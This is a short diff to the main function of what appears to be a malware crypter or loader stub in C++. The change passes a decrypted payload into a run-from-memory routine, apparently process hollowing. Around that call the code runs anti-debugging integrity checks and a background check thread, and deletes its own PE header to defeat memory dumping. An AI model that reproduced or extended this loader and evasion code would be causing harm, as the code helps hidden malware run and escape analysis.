@@ -44,7 +44,7 @@ int main() {
 
     antiDbg.KillIfIntegrityCheckFails();
     RunProcess* runProcess = new RunProcess();
-    runProcess->RunProcessFromMemory(nullptr, payloadManager->GetOEP());
+    runProcess->RunProcessFromMemory(dPayload, payloadManager->GetOEP());
 
     thread checkIntegrity = thread([&antiDbg]() {
         while (true) {
@@ -56,12 +56,12 @@ int main() {
         }
     });
 
+
     // Delete own PE header
     AntiDumping::DeletePEHeader();
 
     delete payloadManager;
     delete runProcess;
-
     checkIntegrity.join();
 
     return 0;
